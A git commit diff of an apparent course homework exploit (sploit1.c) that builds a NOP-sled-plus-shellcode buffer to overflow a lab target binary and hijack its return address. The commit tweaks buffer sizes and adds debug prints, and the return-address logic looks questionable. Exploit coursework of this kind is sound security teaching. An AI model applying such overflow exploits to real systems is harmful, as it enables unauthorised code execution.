698376c0f7224258e9d62cda66cacc8c9b767673
justinhalford <justinhalford@gmail.com>
2024-05-10 00:33:50 -0400

    may 7

--- cs5435-hw4/sploits/sploit1.c
+++ cs5435-hw4/sploits/sploit1.c
@@ -7,30 +7,35 @@
 
 #define TARGET "/srv/target1"
 
-const int BUFFER_SIZE = 12;
+const int BUFFER_SIZE = 500;
 const int OFFSET_TO_RET = 8;
 const int SHELLCODE_LENGTH = sizeof(shellcode) - 1;
 
-int main(int argc, char *argv[]) 
-{
-  char *args[3];
-  char *env[1];
+int main(int argc, char *argv[]) {
+    char *args[3];
+    char *env[1];
+    char buf[BUFFER_SIZE + OFFSET_TO_RET + 100];
 
-  char buf[BUFFER_SIZE + OFFSET_TO_RET + 100];
-  memset(buf, '\x90', sizeof(buf));
-  memcpy(buf + sizeof(buf) - SHELLCODE_LENGTH, shellcode, SHELLCODE_LENGTH);
+    printf("Address of buf: %p\n", (void*)buf);
+    printf("Address of argv[1]: %p\n", (void*)argv[1]);
+    printf("Shellcode length: %d\n", SHELLCODE_LENGTH);
 
-  unsigned int return_address = (unsigned int)argv[1] + OFFSET_TO_RET;
+    memset(buf, '\x90', sizeof(buf));
+    memcpy(buf + sizeof(buf) - SHELLCODE_LENGTH, shellcode, SHELLCODE_LENGTH);
 
-  *(unsigned int*)(buf + OFFSET_TO_RET - 4) = return_address;
+    unsigned int return_address = (unsigned int)argv[1] + OFFSET_TO_RET + 100;
+    printf("Chosen return address: 0x%x\n", return_address);
 
-  args[0] = TARGET;
-  args[1] = buf;
-  args[2] = NULL;
-  env[0] = NULL;
+    *(unsigned int*)(buf + OFFSET_TO_RET - 4) = return_address;
 
-  execve(TARGET, args, env);
-  fprintf(stderr, "execve failed.\n");
+    args[0] = TARGET;
+    args[1] = buf;
+    args[2] = NULL;
+    env[0] = NULL;
 
-  return 0;
+    printf("Executing target program...\n");
+    execve(TARGET, args, env);
+    fprintf(stderr, "execve failed.\n");
+
+    return 0;
 }
